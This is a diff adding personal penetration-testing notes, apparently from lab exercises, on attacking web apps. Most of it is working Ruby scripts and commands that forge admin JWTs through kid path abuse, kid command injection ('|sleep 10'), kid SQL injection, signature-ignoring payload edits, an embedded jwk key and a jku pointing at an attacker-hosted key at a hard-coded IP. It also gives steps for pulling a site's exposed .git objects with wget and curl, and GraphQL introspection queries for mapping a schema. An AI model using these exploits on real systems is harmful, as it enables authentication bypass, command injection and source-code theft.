@@ -1,0 +1,359 @@
+******************************************************************************************
+JWT Issues:
+******************************************************************************************
+
+JWT Example with "KID" header:
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InB1YmxpYy9jc3MvYm9vdHN0cmFwLmNzcyJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gK2VvpvGOyAvhyUzGwWFBliusBVqm_0mOSew9aO6yCM=
+
+Headers = {
+  "typ": "JWT",
+  "alg": "HS256",
+  "kid": "0001"
+}
+
+Payload = {"user":"jimmy"}
+
+Signature = "spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y"
+
+
+Take headers: {"typ":"JWT","alg": "HS256","kid": "0001"} and change the 0001 value to that 
+of a known file on the website, and change the Payload value to "admin". Download the known file: wget http://site.com/css/boostrap.css
+
+Create the following ruby script exploit.rb:
+header = '{"typ":"JWT","alg":"HS256","kid":"public/css/bootstrap.css"}'
+payload = '{"user":"admin"}'
+
+require 'base64'
+require 'openssl'
+
+data = Base64.strict_encode64(header)+"."+ Base64.strict_encode64(payload)
+data.gsub!("=","")
+
+secret = File.open("bootstrap.css").read	#can be any file accessible on server
+
+signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, data))
+
+puts data+"."+signature
+
+
+Run the ruby script: ruby ./exploit.rb
+
+This should give you the new Auth Bearer token to attempt to change the login value.
+
+------------------------------------------------------------------------------------------
+Another JWT Example with "KID" header (remote command execution):
+
+Ruby Code exploit.rb:
+
+require 'base64'
+require 'openssl'
+require 'json'
+
+secret = "1234"
+
+header = {"typ":"JWT","alg":"HS256","kid":"|sleep 10"}.to_json
+data = {"user" => "admin"}.to_json
+
+token = Base64.strict_encode64(header).gsub("=","")+"."+Base64.strict_encode64(data).gsub("=","")
+
+signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, data))
+
+signed_token = token+"."+Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, token))
+
+puts signed_token
+
+
+ruby ./exploit.rb
+
+
+
+------------------------------------------------------------------------------------------Another JWT Example with "KID" header (SQL Injection):
+
+
+Ruby Code:
+
+require 'base64'
+require 'openssl'
+
+header = '{"typ":"JWT","alg":"HS256","kid":"zzzzzzzzzz\' UNION SELECT \'aaa"}'
+payload = '{"user":"admin"}'
+
+data = Base64.strict_encode64(header)+"."+Base64.strict_encode64(payload)
+
+secret = "aaa"
+
+signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, data))
+
+puts data+"."+signature 
+
+
+
+------------------------------------------------------------------------------------------
+JWT Example with keeping the existing signature but changing the payload (user info).
+The Signature is the 3rd part of the value (after the 2nd ".")
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE2MTIyMTQ3MTh9.yiC4sznj9Rz4TRU9yKKj264MwD5Rrg019tdTacLxgDU
+
+Headers: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+Body or payload: eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE2MTIyMTQ3MTh9
+Signature = iC4sznj9Rz4TRU9yKKj264MwD5Rrg019tdTacLxgDU
+
+Decoding the Body = {"username":"test","iat":1612214718}
+	Change the user to admin and re-base64 encode the value
+		eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjEyMjE0NzE4fQ==
+
+			Drop the padding (==) off the end
+	New token will be:
+		eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjEyMjE0NzE4fQ.yiC4sznj9Rz4TRU9yKKj264MwD5Rrg019tdTacLxgDU
+
+Replace the existing token with that one and you should auth a Admin
+
+------------------------------------------------------------------------------------------
+
+JWT allows users to embed public keys (using the jwk value) inside the header of the 
+token. However, the app should never trust this. (CVE-2018-0114 - Cisco Node-Jose)
+
+JWK - JSON Web Key
+
+JWT looks something like this (note the "n" and "e" parameters in headers):
+"signing": {
+    "protected": {
+      "alg": "PS256",
+      "jwk": {
+        "kty": "RSA",
+        "kid": "bilbo.baggins@hobbiton.example",
+        "use": "sig",
+        "n": "n4EPtAOCc9AlkeQHPzHStgAbgs7bTZLwUBZdR8_KuKPEHLd4rHVTeT-O-XV2jRojdNhxJWTDvNd7nqQ0VEiZQHz_AJmSCpMaJMRBSFKrKb2wqVwGU_NsYOYL-QtiWN2lbzcEe6XC0dApr5ydQLrHqkHHig3RBordaZ6Aj-oBHqFEHYpPe7Tpe-OfVfHd1E6cS6M1FZcD1NNLYD5lFHpPI9bTwJlsde3uhGqC0ZCuEHg8lhzwOHrtIQbS0FVbb9k3-tVTU4fg_3L_vniUFAKwuCLqKnS2BYwdq_mzSnbLY7h_qixoR7jig3__kRhuaxwUkRz5iaiQkqgc5gHdrNP5zw",
+        "e": "AQAB"
+      }
+    },
+    "protected_b64u": "eyJhbGciOiJQUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJraWQiOiJiaWxiby5iYWdnaW5zQGhvYmJpdG9uLmV4YW1wbGUiLCJ1c2UiOiJzaWciLCJuIjoibjRFUHRBT0NjOUFsa2VRSFB6SFN0Z0FiZ3M3YlRaTHdVQlpkUjhfS3VLUEVITGQ0ckhWVGVULU8tWFYyalJvamROaHhKV1REdk5kN25xUTBWRWlaUUh6X0FKbVNDcE1hSk1SQlNGS3JLYjJ3cVZ3R1VfTnNZT1lMLVF0aVdOMmxiemNFZTZYQzBkQXByNXlkUUxySHFrSEhpZzNSQm9yZGFaNkFqLW9CSHFGRUhZcFBlN1RwZS1PZlZmSGQxRTZjUzZNMUZaY0QxTk5MWUQ1bEZIcFBJOWJUd0psc2RlM3VoR3FDMFpDdUVIZzhsaHp3T0hydElRYlMwRlZiYjlrMy10VlRVNGZnXzNMX3ZuaVVGQUt3dUNMcUtuUzJCWXdkcV9telNuYkxZN2hfcWl4b1I3amlnM19fa1JodWF4d1VrUno1aWFpUWtxZ2M1Z0hkck5QNXp3IiwiZSI6IkFRQUIifX0",
+    "sig-input": "eyJhbGciOiJQUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJraWQiOiJiaWxiby5iYWdnaW5zQGhvYmJpdG9uLmV4YW1wbGUiLCJ1c2UiOiJzaWciLCJuIjoibjRFUHRBT0NjOUFsa2VRSFB6SFN0Z0FiZ3M3YlRaTHdVQlpkUjhfS3VLUEVITGQ0ckhWVGVULU8tWFYyalJvamROaHhKV1REdk5kN25xUTBWRWlaUUh6X0FKbVNDcE1hSk1SQlNGS3JLYjJ3cVZ3R1VfTnNZT1lMLVF0aVdOMmxiemNFZTZYQzBkQXByNXlkUUxySHFrSEhpZzNSQm9yZGFaNkFqLW9CSHFGRUhZcFBlN1RwZS1PZlZmSGQxRTZjUzZNMUZaY0QxTk5MWUQ1bEZIcFBJOWJUd0psc2RlM3VoR3FDMFpDdUVIZzhsaHp3T0hydElRYlMwRlZiYjlrMy10VlRVNGZnXzNMX3ZuaVVGQUt3dUNMcUtuUzJCWXdkcV9telNuYkxZN2hfcWl4b1I3amlnM19fa1JodWF4d1VrUno1aWFpUWtxZ2M1Z0hkck5QNXp3IiwiZSI6IkFRQUIifX0.SXTigJlzIGEgZGFuZ2Vyb3VzIGJ1c2luZXNzLCBGcm9kbywgZ29pbmcgb3V0IHlvdXIgZG9vci4gWW91IHN0ZXAgb250byB0aGUgcm9hZCwgYW5kIGlmIHlvdSBkb24ndCBrZWVwIHlvdXIgZmVldCwgdGhlcmXigJlzIG5vIGtub3dpbmcgd2hlcmUgeW91IG1pZ2h0IGJlIHN3ZXB0IG9mZiB0by4",
+    "sig": "XslzHQKM0UogsxugMxj0vmFhNijnmCksPyQ0x8SQ5xC9rEg4_3n_22bdJkM6CQWiTSDUuBCgXo3eqb6GhoPnYgnlGouDy0dIeaihl5Nr85uncW29I39OEZel8UtVGTfOxwssibymheBjKVp0_umkQANicz2_JTLGJQ42BgDVq6L2ZyrqIu7onr9B1XC-O9uzN2xoDfRwK7jCJjH1TPH09W9Pi1iLiXuf7liKH5dBDFzfjCqS4p3PQ6KtdT_gMTOg35PErxFfoi_53cr4l-rUv5ZkdcmIadGjMHDBVpfKSHhkZRVrvR0q6Go6TyvzL5l_hONYKKn09pkhFDjN9JvZeQ"
+
+
+Example Exploit:
+
+JWT before:
+eyJhbGciOiJSUzI1NiIsImtpZCI6ImxOd0RHU1NsZkpETEwzeTljTVg1OEE2VFhJZnlVMU9WRHNpTy1IcllHd00ifQ.dGVzdA.c3I9CyTXBLuOMICtVRqfz3PsefangZdGqdaW2LgJ4W-N2uCugsWilZJG5Emb09e-dlOuxW193Cj-3MZI6RPbaX76pbOailYIOfkwm0J8qAyDkLE8Rgth0Sfq03hZsucX9--o242FHdaf81aEezL7tWAx_qg-HGOlbjYoXcb0kGc7hoLbvjHFz-gLTdKMMmudpKu5yTj6113dl3LQBe5bmr0lfyl0ryCqCOK2AfInh7VqR-Ww8RZES9bWnUnyIpWqhjXUMRNuGUGNNp0PljE6FF40HojOFsxxAhrJ-AKm_lr-YzuEslloCxldRgfqiQdT3kixZc-4a7rcV9wCzB_GDg
+
+JWT after:
+eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJraWQiOiJwZW50ZXN0ZXJsYWIiLCJ1c2UiOiJzaWciLCJuIjoiclJiMGJtUUJ4TkJwQ2hwbTRiekdWODFKYUFid1hiU0NZTUg4VmJFQy1veXcwTUpXaU9oZW8zT1k4OGpoSGpFX3lwLU9VLXFKdURXM05JYTZLNzl4YzQ3R0VHdmZJbXdyLWp6cW4zM1R5U2pBVEJ0bG00bTU2aEphb1JMVnFHOHl6T211WEhZSlIzQTE5SzRjTE91QUNmZEQ3UFZaSHo4YjM2cVdlVU9sX2VXQi1hUVhRQ25FaDg0TDNMSHFmaHpnek50c0lCZVZ3SHRRb0JjR29PYjQ2Z3BlSzNJNUNmQmxXTFdPY1BWNWJCSXZpQWx6LUpxLVdxbWpJNkRYaThNREhFeWoyNGYwRVlVSnJiVlN0T1ZKSF9aZWlEQU1FeFFjb3RMOTNPdG1kMmdMUXZORmd4eUFjMHBveE50SVZwcUg3RGJkZEtqemIwX2UxcGJhcTh2b2R3IiwiZSI6IkFRQUIifX0.YWRtaW4.YMovBFr3F5nDxO2rVeescPgNMp-mRhwzehAdKze65z5jpIbRk6p_M-rmXz8zZoLrOwfC_e8oMf8qqhJcxDYGiNwXFhhf5u1Wjy4EurJ-1JkA_MoHF_V2V_-A9DL0qCt1SDEsaxbcWY3hu9VNL1hPCplaSMHjSrHh7NzbjCGNwBC6Hd2qgaABWs6kBCIMspvGgNyqeT-Jan05_ujcsXfMFOfeEcoHll0vHKVQTIPk9pzA9eAmghlb2Sv8A7MLdDh_1oDIF63N06PwT8TsHupigaDHe1qCHMH6H9IJxeT5HMBOBO7eOmAhV_eRf7ib3TDk3G7p0SSwW1XAaE8QVvoOYg
+
+Howto:
+
+Generate private Key:
+openssl genrsa -out private.pem 2048
+
+
+ruby code:
+
+require 'openssl'
+require 'base64'
+require 'json'
+
+priv = OpenSSL::PKey::RSA.new File.read 'private.pem'
+
+pub = priv.public_key
+
+n = Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
+e = Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/,"")
+
+
+header = {"alg" => "RS256", "jwk" => {"kty" => "RSA", "kid" => "pentesterlab", "use" => "sig", "n" => n, "e" => e }}
+
+payload = Base64.urlsafe_encode64("admin").gsub(/=+/,"")
+
+token = Base64.urlsafe_encode64(header.to_json).gsub(/=+/,"")+"."+payload
+
+sign = priv.sign("SHA256",token)
+
+puts token+"."+Base64.urlsafe_encode64(sign).gsub(/=+/,"")
+
+
+------------------------------------------------------------------------------------------
+
+Resigning the JWT:
+
+Original JWT:
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vcGVudGVzdGVybGFiLmNvbS8ud2VsbC1rbm93bi9qd2tzLmpzb24ifQ.eyJ1c2VyIjoidGVzdCJ9.MBMDAWYiCeYQdiqyDQXDGHiQK4GJWU-z0Lf2eJoaYEUSWDH7XgWgFPXSHuU7mFxk9qXrx4xVqHBXJ4otD9AkUgdL-fguh55cexgutZPoZUIjLXh9mCPuG4pUXxpz0hUY8AyMd8IcB-_pjDcphWZPzP8iFm2VBYmcf8ojIYlXyvTn2Ms2te_YhYoBKiDgtm0gOcbt9v-DA4tF0kjfWT51exkqfZT37ZHBcA_vu5MyhJpbvFnWJnsAPZZUDDMvGkI7ZAauiPgxX5Td5oROSxCFjRzbKV9-y53HEqVkA2t-GpTbDNVqKUa09lPkxwKkUA0gSIHuZH6mSVRakKQEVgzQtQ
+
+
+Decodes to:
+Headers = {
+  "typ": "JWT",
+  "alg": "RS256",
+  "jku": "https://site.com/jwks.json"
+}
+
+Payload = {
+  "user": "test"
+}
+
+Signature = "MBMDAWYiCeYQdiqyDQXDGHiQK4GJWU-z0Lf2eJoaYEUSWDH7XgWgFPXSHuU7mFxk9qXrx4xVqHBXJ4otD9AkUgdL-fguh55cexgutZPoZUIjLXh9mCPuG4pUXxpz0hUY8AyMd8IcB-_pjDcphWZPzP8iFm2VBYmcf8ojIYlXyvTn2Ms2te_YhYoBKiDgtm0gOcbt9v-DA4tF0kjfWT51exkqfZT37ZHBcA_vu5MyhJpbvFnWJnsAPZZUDDMvGkI7ZAauiPgxX5Td5oROSxCFjRzbKV9-y53HEqVkA2t-GpTbDNVqKUa09lPkxwKkUA0gSIHuZH6mSVRakKQEVgzQtQ"
+
+Note the JKU referencing a jwks.json file.
+Download it via wget:
+	wget https://site.com/jwks.json
+
+jwks.json contents:
+{
+  "keys": [
+    {
+      "kty": "RSA",
+      "use": "sig",
+      "kid": "pentesterlab",
+      "n": "oTtAXRgdJ6Pu0jr3hK3opCF5uqKWKbm4KkqIiDJSEsQ4PnAz14P_aJnfnsQwgchFGN95cfCO7euC8HjT-u5WHHDn08GQ7ot6Gq6j-fbwMdRWjLC74XqQ0JNDHRJoM4bbj4i8FaBdYKvKmnJ8eSeEjA0YrG8KuTOPbLsglADUubNw9kggRIvj6au88dnBJ9HeZ27QVVFaIllZpMITtocuPkOKd8bHzkZzKN4HJtM0hgzOjeyCfqZxh1V8LybliWDXYivUqmvrzchzwXTAQPJBBfYo9BO6D4Neui8rGbc49OBCnHLCWtPH7m7xp3cz-PbVnLhRczzsQE_3escvTF0FGw",
+      "e": "AQAB",
+      "alg": "RS256"
+    }
+  ]
+}
+
+In order to sign our own JWT file we need to replace the "n" and "e" values with our own
+generated values from our own private key.
+
+Generate private Key:
+	openssl genrsa -out private.pem 2048
+
+Ruby script to use the user 'admin' and to generate new "n" and "e" values that we will put into the new jwks.json
+file:
+
+exploit.rb:
+header = {"typ":"JWT","alg":"RS256","jku":"http://67.40.137.238/mykey.json"}
+payload = {"user":"admin"}
+
+require 'base64'
+require 'openssl'
+require 'json'
+
+token = Base64.urlsafe_encode64(header.to_json).gsub(/=+$/,"")+"."
+token+= Base64.urlsafe_encode64(payload.to_json).gsub(/=+$/,"")
+
+priv = OpenSSL::PKey::RSA.new File.read 'private.pem'
+pub = priv.public_key
+
+n = Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/,"")
+e = Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/,"")
+
+puts "n: "+n
+puts "e: "+e
+
+sign = priv.sign("SHA256", token)
+puts "Final token: "+token+"."+Base64.urlsafe_encode64(sign).gsub(/=+$/,"")
+
+ruby ./exploit.rb
+
+Copy the jwks.json file to mykey.json and then replace the "n" and "e" values with
+the one generated from the ruby script.
+
+Now resend the original HTTP request and you should authenticate as the 'admin' user.
+
+
+******************************************************************************************
+GIT leakage:
+******************************************************************************************
+
+
+Potential access to source code:
+
+Use wget to attempt to download .git repo from website:
+
+wget -r www.mysite.com/.git
+	-r recursive
+
+While it is downloading run a diff to see what changed:
+	git diff
+		this may show you sensitive info that was removed or added.
+
+
+In your browser:
+/.git/config
+/.git/HEAD
+	ref: refs/heads/master
+/.git/refs/heads/master
+	174932cf2e679fcaf227bb95d23349a6e15d16ce
+/.git/objects/bc/17/4932cf2e679fcaf227bb95d23349a6e15d16ce
+	17 is the first 2 characters from the hash in master
+	the 4932cf... is the remaining part of the hash in master
+
+	file is downloaded. probalby gziped???
+	
+
+git init
+ls .git/objects/
+mkdir .git/objects/17		#the 17 must match the directory name from above
+curl http://mysite.com/.git/objects/17/4932cf2e679fcaf227bb95d23349a6e15d16ce -o .git/objects/17/4932cf2e679fcaf227bb95d23349a6e15d16ceobjects
+
+git cat-file -p 174932cf2e679fcaf227bb95d23349a6e15d16ce
+	note the 17 is back at the beginning of the hash
+
+	output of above command should look like this (note the tree):
+
+		tree 58ace0476093d04023f84d7816adacfa7b879c43
+		author Jimmy <jimmy@aol.com> 1612146311 +0000
+		Committer The Dude <thedude@aol.com> 1612146311 +0000
+
+		Initial import
+
+Repeat the above process
+mkdir .git/objects/58
+curl http://mysite.com/.git/objects/58/ace0476093d04023f84d7816adacfa7b879c43 -o .git/objects/58/ace0476093d04023f84d7816adacfa7b879c43
+git cat-file -p	58ace0476093d04023f84d7816adacfa7b879c43
+	output might look something like this:
+		040000 tree b352dde43705f193d2c1d4e6f6a133321186869f	css
+		100644 blob f303c6a7797f5e7a0d5bd31d39a7149366bbf873	favicon.ico
+		100644 blob 5adab1a1c52dc009d4f26bbce30dacc4c93eea33	footer.php
+		100644 blob c3646db7f9c7e6f126c75900fdcce16d50e1da82	header.php
+		100644 blob 88beb94b5e1fc48e1625c89f892b04bffb58225c	index.php
+
+Continue to repeat the process above but for each file you want. In this case index.php:
+mkdir .git/objects/88
+curl http://mysite.com/.git/objects/88/beb94b5e1fc48e1625c89f892b04bffb58225c -o .git/objects/88/beb94b5e1fc48e1625c89f892b04bffb58225c
+git cat-file -p 88beb94b5e1fc48e1625c89f892b04bffb58225c
+	now you should see the contents of the index.php file.
+
+
+
+
+******************************************************************************************
+GraphQL
+******************************************************************************************
+
+Request body containing a query to GraphQL:
+{"operationName":"projects","variables":{"offset":10},"query":"query projects($offset: Int) {\n  projects(offset: $offset, limit: 10) {\n    id\n    name\n    description\n    __typename\n  }\n}\n"}
+
+Replace the data in between the " " to contain the following:
+
+query IntrospectionQuery {\n    __schema {\n      queryType { name }\n      mutationType { name }\n      subscriptionType { name }\n      types {\n        ...FullType\n      }\n      directives {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        onOperation\n        onFragment\n        onField\n      }\n    }\n  }\n\n  fragment FullType on __Type {\n    kind\n    name\n    description\n    fields(includeDeprecated: true) {\n      name\n      description\n      args {\n        ...InputValue\n      }\n      type {\n        ...TypeRef\n      }\n      isDeprecated\n      deprecationReason\n    }\n    inputFields {\n      ...InputValue\n    }\n    interfaces {\n      ...TypeRef\n    }\n    enumValues(includeDeprecated: true) {\n      name\n      description\n      isDeprecated\n      deprecationReason\n    }\n    possibleTypes {\n      ...TypeRef\n    }\n  }\n\n  fragment InputValue on __InputValue {\n    name\n    description\n    type { ...TypeRef }\n    defaultValue\n  }\n\n  fragment TypeRef on __Type {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n        }\n      }\n    }\n  }\n\n
+
+
+So, the new request body looks like this:
+{"operationName":"projects","variables":{"offset":10},"query":"query IntrospectionQuery {\n    __schema {\n      queryType { name }\n      mutationType { name }\n      subscriptionType { name }\n      types {\n        ...FullType\n      }\n      directives {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        onOperation\n        onFragment\n        onField\n      }\n    }\n  }\n\n  fragment FullType on __Type {\n    kind\n    name\n    description\n    fields(includeDeprecated: true) {\n      name\n      description\n      args {\n        ...InputValue\n      }\n      type {\n        ...TypeRef\n      }\n      isDeprecated\n      deprecationReason\n    }\n    inputFields {\n      ...InputValue\n    }\n    interfaces {\n      ...TypeRef\n    }\n    enumValues(includeDeprecated: true) {\n      name\n      description\n      isDeprecated\n      deprecationReason\n    }\n    possibleTypes {\n      ...TypeRef\n    }\n  }\n\n  fragment InputValue on __InputValue {\n    name\n    description\n    type { ...TypeRef }\n    defaultValue\n  }\n\n  fragment TypeRef on __Type {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n        }\n      }\n    }\n  }\n\n"}
+
+If you receive and error message about "Unknown operation named projects" you probably need to remove the "operationName":"projects","variables":{"offset":10}," from the request body and resubmit.
+
+Now you should see all the fields, etc. in the "database". Go back to the original query and insert in the names returned. So, the new request body/query would look like this:
+
+{"operationName":"jimmy","variables":{"offset":10},"query":"query jimmy($offset: Int) {\n  jimmy(offset: $offset, limit: 10) {\n    id\n    name\n    description\n    __typename\n  }\n}\n"}
+
+If you receive an error like "Cannot query field "name" or "description" on type "jimmy"" you may need to remove portions of the query like this:
+
+{"operationName":"jimmy","variables":{"offset":10},"query":"query jimmy($offset: Int) {\n  jimmy(offset: $offset, limit: 10) {\n    id\n    \n    __typename\n  }\n}\n"}
+
+Further, you may be able to extract more information by adding a "value" field
+{"operationName":"jimmy","variables":{"offset":10},"query":"query jimmy($offset: Int) {\n  jimmy(offset: $offset, limit: 10) {\n    id\n    value\n    __typename\n  }\n}\n"}
+
+
+The above should work for older versions of GraphQL. If not, the query below works for current versions:
+
+query IntrospectionQuery {\n    __schema {\n      queryType { name }\n      mutationType { name }\n      subscriptionType { name }\n      types {\n        ...FullType\n      }\n      directives {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        locations\n      }\n    }\n  }\n\n  fragment FullType on __Type {\n    kind\n    name\n    description\n    fields(includeDeprecated: true) {\n      name\n      description\n      args {\n        ...InputValue\n      }\n      type {\n        ...TypeRef\n      }\n      isDeprecated\n      deprecationReason\n    }\n    inputFields {\n      ...InputValue\n    }\n    interfaces {\n      ...TypeRef\n    }\n    enumValues(includeDeprecated: true) {\n      name\n      description\n      isDeprecated\n      deprecationReason\n    }\n    possibleTypes {\n      ...TypeRef\n    } \n  }   \n      \n  fragment InputValue on __InputValue {\n    name\n    description\n    type { ...TypeRef }\n    defaultValue\n  }     \n        \n  fragment TypeRef on __Type {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n        }\n      }\n    } \n  } \n
+
+
+
+
+{"kind":"OBJECT","name":"PtlabIIKey","description":null,"fields":[{"name":"id","description":null,"args":[],"type":{"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"String","ofType":null}},"isDeprecated":false,"deprecationReason":null},
+
+
+{"operationName":"projects","variables":{"offset":10},"query":"query projects($offset: Int) {\n  projects(offset: $offset, limit: 10) {\n    id\n    name\n    description\n    __typename\n  }\n}\n"}87
